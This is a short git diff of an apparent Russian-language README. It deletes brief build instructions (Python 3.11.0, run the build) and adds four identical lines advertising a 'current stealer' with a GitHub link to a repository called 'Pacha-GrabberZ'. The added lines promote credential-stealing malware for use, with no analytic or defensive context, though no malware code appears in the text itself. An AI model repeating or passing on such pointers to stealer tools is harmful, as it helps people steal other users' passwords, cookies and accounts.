@@ -1,8 +1,4 @@
-
-
-
-Всем ку я хз че написать 
-
-Для установки нужен python 3.11.0
-Со всеми прожатыми галочками 
-Далее просто запускайте былд 
+АКТУАЛЬНЫЙ СТИЛЛЕР - https://github.com/Pachatkas/Pacha-GrabberZ
+АКТУАЛЬНЫЙ СТИЛЛЕР - https://github.com/Pachatkas/Pacha-GrabberZ
+АКТУАЛЬНЫЙ СТИЛЛЕР - https://github.com/Pachatkas/Pacha-GrabberZ
+АКТУАЛЬНЫЙ СТИЛЛЕР - https://github.com/Pachatkas/Pacha-GrabberZ
